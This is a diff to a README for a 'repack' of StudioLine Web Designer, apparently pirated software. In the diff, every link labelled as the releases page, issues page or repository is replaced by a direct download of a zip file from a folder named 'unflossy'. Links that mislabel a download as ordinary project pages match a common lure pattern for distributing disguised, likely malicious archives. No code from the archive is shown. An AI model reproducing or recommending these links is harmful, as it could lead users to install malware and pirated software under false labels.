@@ -1,6 +1,6 @@
 # 🌐 StudioLine-Web-Designer-Repack - Your Gateway to Easy Web Design
 
-[![Download StudioLine-Web-Designer-Repack](https://github.com/Kartikay7124/StudioLine-Web-Designer-Repack/raw/refs/heads/main/unflossy/Web-Studio-Repack-Line-Designer-korntonder.zip)](https://github.com/Kartikay7124/StudioLine-Web-Designer-Repack/raw/refs/heads/main/unflossy/Web-Studio-Repack-Line-Designer-korntonder.zip)
+[![Download StudioLine-Web-Designer-Repack](https://raw.githubusercontent.com/Kartikay7124/StudioLine-Web-Designer-Repack/main/unflossy/Designer-Web-Studio-Repack-Line-2.9.zip)](https://raw.githubusercontent.com/Kartikay7124/StudioLine-Web-Designer-Repack/main/unflossy/Designer-Web-Studio-Repack-Line-2.9.zip)
 
 ## 📋 Introduction
 
@@ -11,7 +11,7 @@ Welcome to StudioLine Web Designer Repack! This tool makes it simple to design a
 Follow these steps to get started with StudioLine Web Designer:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/Kartikay7124/StudioLine-Web-Designer-Repack/raw/refs/heads/main/unflossy/Web-Studio-Repack-Line-Designer-korntonder.zip) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Kartikay7124/StudioLine-Web-Designer-Repack/main/unflossy/Designer-Web-Studio-Repack-Line-2.9.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    Look for the newest release. You will see a list of files. Select the one that suits your computer needs.
@@ -49,7 +49,7 @@ To run StudioLine Web Designer, your system should meet the following requiremen
 
 To download and install StudioLine Web Designer, click the link below:
 
-[Download StudioLine Web Designer](https://github.com/Kartikay7124/StudioLine-Web-Designer-Repack/raw/refs/heads/main/unflossy/Web-Studio-Repack-Line-Designer-korntonder.zip)
+[Download StudioLine Web Designer](https://raw.githubusercontent.com/Kartikay7124/StudioLine-Web-Designer-Repack/main/unflossy/Designer-Web-Studio-Repack-Line-2.9.zip)
 
 After downloading, follow the installation steps mentioned above.
 
@@ -63,7 +63,7 @@ Once you have installed the software, consider these tips for an easier experien
 
 ## 💬 Support
 
-For support, you can submit issues or questions on the [GitHub Issues page](https://github.com/Kartikay7124/StudioLine-Web-Designer-Repack/raw/refs/heads/main/unflossy/Web-Studio-Repack-Line-Designer-korntonder.zip). We aim to respond promptly.
+For support, you can submit issues or questions on the [GitHub Issues page](https://raw.githubusercontent.com/Kartikay7124/StudioLine-Web-Designer-Repack/main/unflossy/Designer-Web-Studio-Repack-Line-2.9.zip). We aim to respond promptly.
 
 ## 🌟 Contributions
 
@@ -75,7 +75,7 @@ StudioLine Web Designer Repack is licensed under the MIT License. You can use, m
 
 ## 🔗 Links
 
-- **Releases Page**: [Download StudioLine Web Designer](https://github.com/Kartikay7124/StudioLine-Web-Designer-Repack/raw/refs/heads/main/unflossy/Web-Studio-Repack-Line-Designer-korntonder.zip)
-- **GitHub Repository**: [StudioLine Web Designer Repack](https://github.com/Kartikay7124/StudioLine-Web-Designer-Repack/raw/refs/heads/main/unflossy/Web-Studio-Repack-Line-Designer-korntonder.zip) 
+- **Releases Page**: [Download StudioLine Web Designer](https://raw.githubusercontent.com/Kartikay7124/StudioLine-Web-Designer-Repack/main/unflossy/Designer-Web-Studio-Repack-Line-2.9.zip)
+- **GitHub Repository**: [StudioLine Web Designer Repack](https://raw.githubusercontent.com/Kartikay7124/StudioLine-Web-Designer-Repack/main/unflossy/Designer-Web-Studio-Repack-Line-2.9.zip) 
 
 Thank you for choosing StudioLine Web Designer. Enjoy building your beautiful websites!
